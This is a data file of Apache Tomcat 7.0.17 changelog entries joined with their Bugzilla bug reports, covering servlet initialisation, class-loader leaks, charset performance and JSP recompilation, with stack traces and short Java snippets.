Catalina|Tomcat 7.0.17 (markt)|add|50677|"Allow system property variables to be used in the values of ""common.loader"" and other ""*.loader"" properties in the catalina.properties file. (kkolinko)"|Allow system property variables in catalina.properties|"We currently have two hardcoded ""variables"" that we substitute in catalina.properties, ${catalina.base} and ${catalina.home}.  Is there value in expanding this functionality?  Here is my scenario:

I have several apps, app1, app2, etc.  I have a shared lib directory of jars that the apps share.  In addition, the apps may have several instances running in different ""environments"" (prod, QA, dev, etc.), and each environment has a corresponding version of the lib directory.  The Tomcat configs for the apps (catalina.base) are version-controlled.

Now, I want each instance of these apps (catalina.base) to be as portable as possible without having to make a bunch of changes for each environment.  So, I want to be able to copy the app1-prod catalina.base to app1-qa and not have to make a lot of local modifications to catalina.properties and friends to make it work.  My init script knows that app1-qa is a QA instance and needs to point to the lib-qa shared directory.  So, I set a system property in the init script via CATALINA_OPTS: -Dshared.lib.dir=/path/to/lib-qa for QA and -Dshared.lib.dir=/path/to/lib-prod for production.  What I would like to do is use this system property via ${property.name} in my common.loader in catalina.properties.  The result is that the catalina.base files are the exact same from a configuration perspective without a bunch of local modifications.

I have created two proposed patches for this functionality.  Both work well, but each one has the potential for some slightly different behavior, so I would like to hear the thoughts of the developers on each.

--

Proposal A (currently in production use for my environment):

The variable substitution takes place upon retrieval in CatalinaProperties.getProperty(), pulling in the current value of the system property.  This allows other properties defined in catalina.properties to be substituted.  The (potential) downside or risk is that the value of a catalina.property value may change over time if the system properties referenced in its value are changed by the code during the JVM's lifecycle.

--

Proposal B:

The variable substitution takes place in the class initializer, loadProperties().  This means that every call to CatalinaProperties.getProperty() will return the same result, with system property variables replaced with their value at the time the class was loaded.  The downside of this is that properties set in catalina.properties cannot be used in other properties defined in that file, because they may not yet be set based on the order they are returned by the Enumeration.  This could be worked around, but it would probably take another iteration over the properties (not really a big deal)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50677
Catalina|Tomcat 7.0.17 (markt)|fix|51376|When adding a Servlet via ServletContext#addServlet(String, Servlet), the Servlet was not initialized when the web application started and a load on startup value was set. (markt)|Dynamically added Servlet instances ignore setLoadOnStartup(), @ServletSecurity, etc|"When a pre-existing instance of Servlet class is added dynamically by calling ServletContext.addServlet(String, Servlet) in ServletContainerInitializer, multiple problems arise:

 * setLoadOnStartup() is ignored
 * @ServletSecurity is ignored
 * destroy() can be called on non-initialized servlet

Adding a servlet class (addServlet(String, String), addServlet(String, Class)) doesn't have this problems.

It happens because methods of org.apache.catalina.core.StandardWrapper treat presence of servlet instance as an indicator of the fact that servlet have been initialized, that is not true when addServlet(String, Servlet) is used."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51376
Catalina|Tomcat 7.0.17 (markt)|fix|51386|Correct code for processing @HandlesTypes annotations so only types of interest are reported to a ServletContainerInitializer. (markt)|@HandlingType not correctly handled at server startup leads to incorrect classes set passed to initializers|"The following code in org.apache.catalina.startup.ContextConfig.checkHandlesTypes(JavaClass) looks very buggy :

  boolean match = false;
          
  for (Map.Entry<Class<?>, Set<ServletContainerInitializer>> entry :
          typeInitializerMap.entrySet()) {
      if (entry.getKey().isAnnotation()) {
          AnnotationEntry[] annotationEntries = javaClass.getAnnotationEntries();
          for (AnnotationEntry annotationEntry : annotationEntries) {
              if (entry.getKey().getName().equals(
                  getClassName(annotationEntry.getAnnotationType()))) {
                  match = true;
                  break;
              }
          }
      } else if (entry.getKey().isAssignableFrom(clazz)) {
          match = true;
      }
      if (match) {
          for (ServletContainerInitializer sci : entry.getValue()) {
              initializerClassMap.get(sci).add(clazz);
          }
      }
  }

Shouldn't ""match"" variable be reset to false at each iteration ?

As it is for now, my SpringServletContainerInitializer (3.1M2), handling only WebApplicationInitializers, will finally receive a huge set of various applicative classes, starting from the first class parsed matching any type handled by any previously parsed ServletContainerInitializer !!!

http://svn.apache.org/repos/asf/tomcat/trunk/java/org/apache/catalina/startup/ContextConfig.java"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51386
Catalina|Tomcat 7.0.17 (markt)|update||Add the Tomcat extras, ant-junit and Java Help Jars to the list of JARs to skip when scanning for TLDs and web fragments. (rjung)|||
Catalina|Tomcat 7.0.17 (markt)|fix||The fix for bug 51310 caused a regression that re-introduced bug 49957 and deleted the contents of the work directory when Tomcat was shutdown. This fix ensures that that work directory for an application is not deleted when Tomcat is shutdown. (markt)|Connector destroyInternal Execution|In Tomcat 7.0.12 Connector#destroyInternal method has never been called while server is under shutdown. Therefore NIOBlockingSelector#close is never called. Is it bug or else?|https://bz.apache.org/bugzilla/show_bug.cgi?id=51310
Catalina|Tomcat 7.0.17 (markt)|fix||Correct issues with JULI's OneLineFormatter including: correctly re-using formatted timestamps when possible; thread-safety issues in timestamp formatting; correcting the output of any milliseconds to include leading zeros and formatting any parameters present. (kkolinko/markt/rjung)|||
Catalina|Tomcat 7.0.17 (markt)|fix|51395|Fix memory leak triggered when an application that includes a SAXParserFactory is the first web application to be loaded. (markt)|First application that loads SAXParserFactory causes Class loader memory leak|"Overview
The class org.apache.catalina.startup.ContextConfig has an array of org.apache.tomcat.util.digester.Digester objects. Each Digester has a field factory to refer to a SAXParserFactory. If that SAXParserFactory is loaded via a WebappClassLoader, that WebappClassLoader is stuck in memory.

Steps to reproduce
Create a Web application that has xercesImpl.jar in its lib. (The Web application itself doesn't need to use any of the xerces classes.) Upload the application war file using Tomcat Manager. Verify that the application is loaded via Tomcat Manager -> List Applications

Restart Tomcat. Via Tomcat Manager -> List Applications, verify that the application is running. Undeploy the application. Click on Find leaks. The message above shows the application as leaking.

Make a memory dump using jmap, inspect the memory using jhat.
The WebappClassLoader for this application is still present. Its ""reference chains from rootset"" shows a chain like this:
Static reference from org.apache.catalina.startup.ContextConfig.webDigesters (from class org.apache.catalina.startup.ContextConfig) :
--> [Lorg.apache.tomcat.util.digester.Digester;@0x78be4958 (24 bytes) (Element 0 of [Lorg.apache.tomcat.util.digester.Digester;@0x78be4958:)
--> org.apache.tomcat.util.digester.Digester@0x78be3c50 (101 bytes) (field factory:)
--> org.apache.xerces.jaxp.SAXParserFactoryImpl@0x78bf0b28 (20 bytes) (??:)
--> class org.apache.xerces.jaxp.SAXParserFactoryImpl (84 bytes) (??:)
--> org.apache.catalina.loader.WebappClassLoader@0x78be3ea0 (165 bytes)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51395
Catalina|Tomcat 7.0.17 (markt)|fix|51396|Correctly handle jsp-file entries in web.xml when the JSP servlet has been configured via code when embedding Tomcat. (markt)|Embedding class cannot launch a webapp with a jsp servlet|"https://github.com/bimargulies/Tomcat-Solr-Test-Case is a test case. It creates an instance of Tomcat and then adds a webapp from Apache Solr. This webapp has 'jsp' servlets.

The code crashes, because the implicit default web.xml used in this case does not include a servlet named jsp, resulting in the following backtrace.



2011-06-20 12:56:24,598 [Embedded Tomcat] INFO org.apache.catalina.startup.ContextConfig - No global web.xml found
Exception in thread ""Embedded Tomcat"" java.lang.NullPointerException
	at org.apache.catalina.startup.ContextConfig.convertJsp(ContextConfig.java:1379)
	at org.apache.catalina.startup.ContextConfig.convertJsps(ContextConfig.java:1358)
	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1349)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:881)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:316)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5103)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:812)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:787)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:607)
	at org.apache.catalina.startup.Tomcat.addWebapp(Tomcat.java:509)
	at org.apache.catalina.startup.Tomcat.addWebapp(Tomcat.java:483)
	at org.apache.catalina.startup.Tomcat.addWebapp(Tomcat.java:171)
	at org.apache.tomcat.tc.solrWebapp.LaunchWithSolr.tryToAddSolr(LaunchWithSolr.java:111)
	at org.apache.tomcat.tc.solrWebapp.LaunchWithSolr.access$1(LaunchWithSolr.java:106)
	at org.apache.tomcat.tc.solrWebapp.LaunchWithSolr$1.run(LaunchWithSolr.java:91)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51396
Catalina|Tomcat 7.0.17 (markt)|fix|51400|Avoid known bottleneck in JVM when converting between Strings and bytes by always providing a Charset rather than an encoding name. Based on a patch by Dave Engberg. (markt)|"Use of ""new String(byte[] b, String enc)"" hits Sun JVM bottleneck"|"Created attachment 27186 [details]
Patch with optimizations

We're using Tomcat 6 for a high-volume, high-concurrency service (Evernote).  At times, we've seen a performance slowdown within the service, which we've traced to a concurrency flaw within the JVM code that translates named encodings (e.g. ""utf-8"") into Charsets.  This translates into a number of stuck threads trying to convert a byte array to a String or vice versa, ala:

  java.lang.Thread.State: BLOCKED (on object monitor)
       at sun.nio.cs.FastCharsetProvider.charsetForName(Unknown Source)
       - waiting to lock <0x00007ff3b4cc85b0> (a sun.nio.cs.StandardCharsets)
       at java.nio.charset.Charset.lookup2(Unknown Source)
       at java.nio.charset.Charset.lookup(Unknown Source)
       at java.nio.charset.Charset.isSupported(Unknown Source)
       at java.lang.StringCoding.lookupCharset(Unknown Source)
       at java.lang.StringCoding.decode(Unknown Source)
       at java.lang.String.<init>(Unknown Source)
       at org.apache.tomcat.util.buf.ByteChunk.toStringInternal(ByteChunk.java:499)
       at org.apache.tomcat.util.buf.StringCache.toString(StringCache.java:315)
       at org.apache.tomcat.util.buf.ByteChunk.toString(ByteChunk.java:492)
       at org.apache.tomcat.util.buf.MessageBytes.toString(MessageBytes.java:213)
       at org.apache.tomcat.util.http.MimeHeaders.getHeader(MimeHeaders.java:319)
       at org.apache.coyote.Request.getHeader(Request.java:330)
       at org.apache.catalina.connector.Request.getHeader(Request.java:1854)
       at org.apache.catalina.connector.RequestFacade.getHeader(RequestFacade.java:643)

This isn't a true deadlock, since each thread will eventually finish, but it can
significantly affect concurrency if there are a number of threads making heavy use of:
   new String(byte[] b, String encoding)
   String.getBytes()
   String.getBytes(String encoding)

This is, unfortunately, a known bottleneck within the JVM:
http://blog.inuus.com/vox/2008/05/the-mysteries-of-java-character-set-performance.html
http://halfbottle.blogspot.com/2009/07/charset-continued-i-wrote-about.html
http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6790402


To avoid this bottleneck in the JVM, we've patched our server to use the explicit Charset object for String encoding rather than the name of the charset, and then added a ConcurrentHashMap<String, Charset> to lookup charsets by encodings.

I've attached a patch with our fixes on 6.0.32

Just as a random FYI - the same issue hits MySQL's Java connector, so we'd occasionally see Tomcat and MySQL fighting over this same JVM chokepoint:  http://bugs.mysql.com/bug.php?id=61105"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51400
Catalina|Tomcat 7.0.17 (markt)|fix|51401|Correctly initialise shared WebRuleSet instance used by the digesters that parse web.xml and prevent incorrect warnings about multiple occurrences of elements that are only allowed to appear once in web.xml and web-fragment.xml. (kfujino)|java.lang.IllegalArgumentException: <session-config> element is limited to 1 occurrence|"Created attachment 27188 [details]
logfile

I got following Exception when I started Tomcat.
I hadn't changed any configuration.

-----
java.lang.IllegalArgumentException: <session-config> element is limited to 1 occurrence
        at org.apache.catalina.startup.SetSessionConfig.begin(WebRuleSet.java:722)
        at org.apache.tomcat.util.digester.Digester.startElement(Digester.java:1282)
        at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.startElement(AbstractSAXParser.java:501)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanStartElement(XMLDocumentFragmentScannerImpl.java:1363)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2755)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511)
        at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808)
        at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)
        at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119)
        at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205)
        at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522)
        at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1543)
        at org.apache.catalina.startup.ContextConfig.parseWebXml(ContextConfig.java:1744)
        at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1241)
        at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:885)
        at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:344)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89)
        at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5103)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
        at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:812)
        at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:787)
        at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:607)
        at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:932)
        at org.apache.catalina.startup.HostConfig.deployWARs(HostConfig.java:723)
        at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:470)
        at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1322)
        at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:311)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:89)
        at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:379)
        at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:324)
        at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1041)
        at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:774)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
        at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1033)
        at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:291)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
        at org.apache.catalina.core.StandardService.startInternal(StandardService.java:443)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
        at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:727)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
        at org.apache.catalina.startup.Catalina.start(Catalina.java:620)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:321)
        at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:449)
---

This exception occurs at the applications that contain <session-config> or <login-config> in the web.xml.

When I reverted the code back to the revision 1137764, I got no exception.

Regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51401
Catalina|Tomcat 7.0.17 (markt)|add|51403|Avoid NPE in JULI FileHandler if formatter is misconfigured. (kkolinko)|Avoid NullPointerException in JULI FileHandler if formatter is misconfigured|"If formatter assigned to org.apache.juli.FileHandler in logging.properties is misconfigured and fails to load,
the FileHandler starts without formatter and fails with an NPE later.

To reproduce: assign some bogus value to
1catalina.org.apache.juli.FileHandler.formatter

When Tomcat starts, the following will be printed at the console:

java.util.logging.ErrorManager: 4
java.lang.NullPointerException
        at org.apache.juli.FileHandler.openWriter(FileHandler.java:377)
        at org.apache.juli.FileHandler.<init>(FileHandler.java:99)
        at org.apache.juli.FileHandler.<init>(FileHandler.java:90)


I think we can be more tolerant to this configuration error and fall back to the default formatter. I will commit a fix shortly."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51403
Catalina|Tomcat 7.0.17 (markt)|fix||Previous improvements in JAR scanning performance introduced a start-up performance penalty for some use cases. This fix addresses those performance penalties while retaining the original improvements. (markt)|||
Catalina|Tomcat 7.0.17 (markt)|add|51418|Provide more control over Context creation when embedding Tomcat. Based on a patch by Benson Margulies. (markt/kkolinko)|Allow more flexibility in adding webapps to org.apache.catalina.startup.Tomcat|"Created attachment 27194 [details]
A patch to Tomcat.java as described.

the Tomcat.addWebapp all create a context, set up the default realm, and set up the surrogate global web.xml lifecycle listener. They differ according to allowing more or less specific configuration of the new webapp. At the end, they add the new context to the host.

Once the container is running, the act of calling addChild starts it. Some configuration steps have to precede 'start' -- for example, setting the loader. Thus, in a complex case, the user needs to take more control of the process.

As things are today, this requires subclassing the Tomcat class and then copying code from the four-arg addWebapp.

The patch provided here allows non-subclasses to take complete control of the process. It accomplishes this by providing methods to obtain three things that are otherwise buried in the Tomcat class: the default in-memory realm, the listener that serves as a surrogate global web.xml, and a dummy pathname to allow the listener to work without conflicts.

Given these accessors, a user can simple create a the context (and its ContextConfig) and configure it to their heart's content, and then pass it to the addChild method of a Host."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51418
Catalina|Tomcat 7.0.17 (markt)|fix||"Remove redundant copy of catalina.properties from o.a.c.startup. Generate this copy for inclusion in bin and src jars during the ant ""compile"" task. (rjung)"|||
Catalina|Tomcat 7.0.17 (markt)|fix||Use system properties loaded from catalina.properties via the class path in unit tests. (rjung)|||
Catalina|Tomcat 7.0.17 (markt)|update||Improve JMX unit test. (rjung)|||
Catalina|Tomcat 7.0.17 (markt)|fix||Fix IllegalStateException for JavaScript files when switching from Writer to OutputStream. The special handling of this case in the DefaultServlet was broken due to a MIME type change for JavaScript. (funkman)|||
Catalina|Tomcat 7.0.17 (markt)|fix||Fix CVE-2011-2204. Prevent user passwords appearing in log files if a runtime exception (e.g. OOME) occurs while creating a new user for a MemoryUserDatabase via JMX. (markt)|||
Catalina|Tomcat 7.0.17 (markt)|fix||Fix an issue with the CrawlerSessionManagerValve that meant sessions were not always correctly tracked. (markt)|||
Catalina|Tomcat 7.0.17 (markt)|fix|51436|Send 100 (Continue) response earlier to enable ServletRequestListener implementations to read the request body. Based on a patch by Simon Olofsson. (markt)|ServletRequestListener fails to access request parameters when an Expect-Header is sent|"Created attachment 27209 [details]
Acknowledge a request before any listeners are called.

I wrote a ServletRequestListener that tries to access a Request Parameter in requestInitialized(.) with:
 sre.getServletRequest().getParameter(""x"");

This works fine with POST-Requests. But when I send the ""Expect: 100-continue"" HTTP Header the Listener hangs, waiting for the Request Body. See the stacktrace at:
 http://pastebin.com/r2J0P3qx
This happens because the Request isn't acknowledged and thus the body (containing the parameters) isn't send.

The attached patch fixes this by acknowledging the request before the listeners are called. With the patch applied everything works fine and all tests pass."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51436
Catalina|Tomcat 7.0.17 (markt)|fix||Ensure an access log entry is made if an error occurs during asynchronous request processing and the socket is immediately closed. (markt)|||
Catalina|Tomcat 7.0.17 (markt)|fix||Ensure that if asyncDispatch() is called during an onTimeout event and the target Servlet does not call startAsync() or complete() that Tomcat calls complete() once the target Servlet exits. (markt)|||
Catalina|Tomcat 7.0.17 (markt)|fix||Improve the handling for Servlets that implement the deprecated SingleThreadModel when embedding Tomcat. (markt)|||
Catalina|Tomcat 7.0.17 (markt)|fix|51445|Correctly initialise all instances of Servlets that implement SingleThreadModel. Based on a patch by Felix Schumacher. (markt)|Tomcat 7 SingleThreadModel Problem|"I have noticed that in tomcat 7 if we implement SingleThreadModel and initialize some variables into init(ServletConfig config) method, in that case values initialized in init(ServletConfig config) not reflected into service block.

For Example : Following code will print ""0"".

import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.SingleThreadModel;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class test extends HttpServlet implements SingleThreadModel
{

    int i = 0;

    @Override
    public void init(ServletConfig config) throws ServletException
    {
        super.init(config);
        i = 10;
    }
    protected void processRequest(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException
    {
        response.setContentType(""text/html;charset=UTF-8"");
        PrintWriter out = response.getWriter();
        try
        {
            out.println(i);
        }
        finally
        {
            out.close();
        }
    }
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException
    {
        processRequest(request, response);
    }
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException
    {
        processRequest(request, response);
    }
    @Override
    public String getServletInfo()
    {
        return ""Short description"";
    }
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51445
Catalina|Tomcat 7.0.17 (markt)|fix|51453|Fix a regression in the preemptive authentication support (enhancement 12428) that could trigger authentication even if preemptive authentication was disabled. (markt)|Requests to open URL that include an Authorization header do not reach servlet|"In Tomcat 7, I've noticed that a request to a URL that does not require authentication will get forwarded to the login page if the request contains an ""Authorization"" header.

Our application expects these requests to be processed by the servlet.  The servlet parses the Authorization header and takes appropriate action (possibly redirecting to the login page or allowing the request if the headers contain an acceptible token).  This has worked in older versions of Tomcat.

The relevant part of our web.xml looks like:

<security-constraint>

  <web-resource-collection>
    <web-resource-name>open</web-resource-name>
    <url-pattern>/*</url-pattern>
    <!-- several other url patterns -->
  </web-resource-collection>

  <user-data-constraint>
    <transport-guarantee>CONFIDENTIAL</transport-guarantee>
  </user-data-constraint>

  <!-- Notice no auth-constraint element -->

</security-constraint>

I observed the behavior of org.apache.catalina.authenticator.AuthenticatorBase.invoke(), here's what I saw:

The constraints variable contains a single constraint that matches the security constraint from our web.xml above.

On line 520, authRequired is set to true because of the presence of the Authorization header.

The authenticate() call on line 535 fails and redirects to the login page."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51453
Catalina|Tomcat 7.0.17 (markt)|fix||Prevent possible NPE when serving Servlets that implement the SingleThreadModel interface. (markt)|||
Catalina|Tomcat 7.0.17 (markt)|fix||In launcher for embedded Tomcat: do not change catalina.home system property if it had a value. (kkolinko)|||
Catalina|Tomcat 7.0.17 (markt)|fix||When using Servlets that implement the SingleThreadModel interface, add the single instance created to the pool when it is determined that a pool of servlets is required rather than throwing it away. (markt)|||
Coyote|Tomcat 7.0.17 (markt)|fix||Fix unit test for bindOnInit which was failing for APR on some platforms. (rjung)|||
Coyote|Tomcat 7.0.17 (markt)|fix||Remove superfluous quotes from thread names for connection pools. (rjung)|||
Coyote|Tomcat 7.0.17 (markt)|fix||Fix crash observed during pausing the connector when using APR. Only add socket to poller if we are sure we don't close it later. (rjung)|||
Coyote|Tomcat 7.0.17 (markt)|update||Various refactorings to reduce code duplication and unnecessary code in the connectors. (markt)|||
Coyote|Tomcat 7.0.17 (markt)|fix||Correct a regression introduced in Apache Tomcat 7.0.11 that broke certificate revocation list handling. (markt)|||
Jasper|Tomcat 7.0.17 (markt)|update||Improve the message printed by TldLocationsCache and add configuration example to the logging.properties file. (kkolinko)|||
Jasper|Tomcat 7.0.17 (markt)|fix|33453|Recompile JSPs if last modified time of the source or any of its dependencies changes either forwards or backwards. Note that this introduces an incompatible change to the code generated for JSPs. Tomcat will automatically re-compile any JSPs and tag files found in the work directory when upgrading from 7.0.16 or earlier to 7.0.17 or later. If you later downgrade from 7.0.17 or later to 7.0.16 or earlier, you must empty the work directory as part of the downgrade process. (markt)|Jasper should recompile JSP files whose datestamps change in either direction (not just newer)|"I've noticed that Tomcat won't recompile a JSP file if the date stamp is changed
to go back in time. This may seem like a strange case, but if you check an older
copy of a JSP page out of version control, it's different, and needs to be
recompiled. The assumption that all changes to a file involve a newer file
datestamp is an invalid one.

I think I found the code that makes this decision, in
org.apache.jasper.compiler.Compiler, in the isOutDated(boolean) method. The
condition is
        if (targetLastModified < jspRealLastModified)
but it should be
        if (targetLastModified != jspRealLastModified)
in my opinion.

After all, the logic should be that the file has changed, not that it's newer. I
don't think it's reasonable to expect that Jasper check the size and do an MD5
checksum to *really* see if the file has changed. :)

Obviously the workaround is to just to ""touch"" the file but this adds a lot of
overhead (and one more thing to remember), compared to changing a > to a !=."|https://bz.apache.org/bugzilla/show_bug.cgi?id=33453
Jasper|Tomcat 7.0.17 (markt)|fix|36362|Handle the case where tag file attributes (which can use any valid XML name) have a name which is not a Java identifier. (markt/kkolinko)|missing check for Java reserved keywords in tag file processing|"Tag file attribute names are used as identifiers in Java source code generated
from the tag file without any mangling.  If the attribute name is a Java
keyword, this leads to a compilation error.  As an example, try to use the
following tag file, bug.tag

<%@ tag isELIgnored=""false"" %>
<%@ attribute name=""default"" %>
${default}

Somewhere during tag file processing, attribute names could be checked against
the list of Java keywords in org.apache.jasper.compiler.JspUtils"|https://bz.apache.org/bugzilla/show_bug.cgi?id=36362
Jasper|Tomcat 7.0.17 (markt)|add||Broaden the exception handling in the EL Parser so that more failures to parse an expression include the failed expression in the exception message. Hopefully, this will help track down the cause of 51088. (markt)|ArrayIndexOutOfBoundsException from org.apache.el.parser.JJTELParserState|"I found the following ArrayIndexOutOfBoundsException in my logfile.
It occurred directly after login into my webApp without any further user interaction. Unfortunately it is not reproducible at all.

I am not sure whether Jasper is the right component. However the class  JJTELParserState is in the jasper-el.jar.

Environment:
Tomcat 6.0.32 
Facelets 1.1.14
Myfaces 1.2.9

SCHWERWIEGEND: Error Rendering View[/facelets/myview.xhtml]
java.lang.ArrayIndexOutOfBoundsException: -1
	at java.util.ArrayList.remove(ArrayList.java:390)
	at org.apache.el.parser.JJTELParserState.closeNodeScope(JJTELParserState.java:108)
	at org.apache.el.parser.ELParser.CompositeExpression(ELParser.java:74)
	at org.apache.el.lang.ExpressionBuilder.createNodeInternal(ExpressionBuilder.java:115)
	at org.apache.el.lang.ExpressionBuilder.build(ExpressionBuilder.java:172)
	at org.apache.el.lang.ExpressionBuilder.createValueExpression(ExpressionBuilder.java:216)
	at org.apache.el.ExpressionFactoryImpl.createValueExpression(ExpressionFactoryImpl.java:68)
	at com.sun.facelets.el.ELText$ELTextVariable.apply(ELText.java:161)
	at com.sun.facelets.compiler.AttributeInstruction.apply(AttributeInstruction.java:60)
	at com.sun.facelets.compiler.UIInstructionHandler.apply(UIInstructionHandler.java:95)
	at com.sun.facelets.tag.CompositeFaceletHandler.apply(CompositeFaceletHandler.java:47)
	at com.sun.facelets.tag.jstl.core.IfHandler.apply(IfHandler.java:54)
	at com.sun.facelets.tag.CompositeFaceletHandler.apply(CompositeFaceletHandler.java:47)
	at com.sun.facelets.tag.jsf.ComponentHandler.applyNextHandler(ComponentHandler.java:360)
	at com.sun.facelets.tag.jsf.ComponentHandler.apply(ComponentHandler.java:190)
	at com.sun.facelets.tag.CompositeFaceletHandler.apply(CompositeFaceletHandler.java:47)
	at com.sun.facelets.tag.jsf.ComponentHandler.applyNextHandler(ComponentHandler.java:360)
	at com.sun.facelets.tag.jsf.ComponentHandler.apply(ComponentHandler.java:190)
	at com.sun.facelets.tag.CompositeFaceletHandler.apply(CompositeFaceletHandler.java:47)
	at com.sun.facelets.tag.jsf.ComponentHandler.applyNextHandler(ComponentHandler.java:360)
	at org.apache.myfaces.custom.aliasbean.AliasBeansScopeTagHandler.applyNextHandler(AliasBeansScopeTagHandler.java:52)
	at com.sun.facelets.tag.jsf.ComponentHandler.apply(ComponentHandler.java:190)
	at com.sun.facelets.tag.CompositeFaceletHandler.apply(CompositeFaceletHandler.java:47)
	at com.sun.facelets.tag.ui.CompositionHandler.apply(CompositionHandler.java:124)
	at com.sun.facelets.compiler.NamespaceHandler.apply(NamespaceHandler.java:49)
	at com.sun.facelets.compiler.EncodingHandler.apply(EncodingHandler.java:39)
	at com.sun.facelets.impl.DefaultFacelet.include(DefaultFacelet.java:248)
	at com.sun.facelets.impl.DefaultFacelet.include(DefaultFacelet.java:294)
	at com.sun.facelets.impl.DefaultFacelet.include(DefaultFacelet.java:273)
	at com.sun.facelets.impl.DefaultFaceletContext.includeFacelet(DefaultFaceletContext.java:140)
	at com.sun.facelets.tag.ui.IncludeHandler.apply(IncludeHandler.java:66)
	at com.sun.facelets.tag.ui.DefineHandler.applyDefinition(DefineHandler.java:64)
	at com.sun.facelets.tag.ui.CompositionHandler.apply(CompositionHandler.java:136)
	at com.sun.facelets.impl.DefaultFaceletContext$TemplateManager.apply(DefaultFaceletContext.java:337)
	at com.sun.facelets.impl.DefaultFaceletContext.includeDefinition(DefaultFaceletContext.java:307)
	at com.sun.facelets.tag.ui.InsertHandler.apply(InsertHandler.java:68)
	at com.sun.facelets.tag.CompositeFaceletHandler.apply(CompositeFaceletHandler.java:47)
	at com.sun.facelets.tag.jsf.ComponentHandler.applyNextHandler(ComponentHandler.java:360)
	at com.sun.facelets.tag.jsf.ComponentHandler.apply(ComponentHandler.java:190)
	at com.sun.facelets.tag.CompositeFaceletHandler.apply(CompositeFaceletHandler.java:47)
	at com.sun.facelets.tag.jsf.ComponentHandler.applyNextHandler(ComponentHandler.java:360)
	at com.sun.facelets.tag.jsf.ComponentHandler.apply(ComponentHandler.java:190)
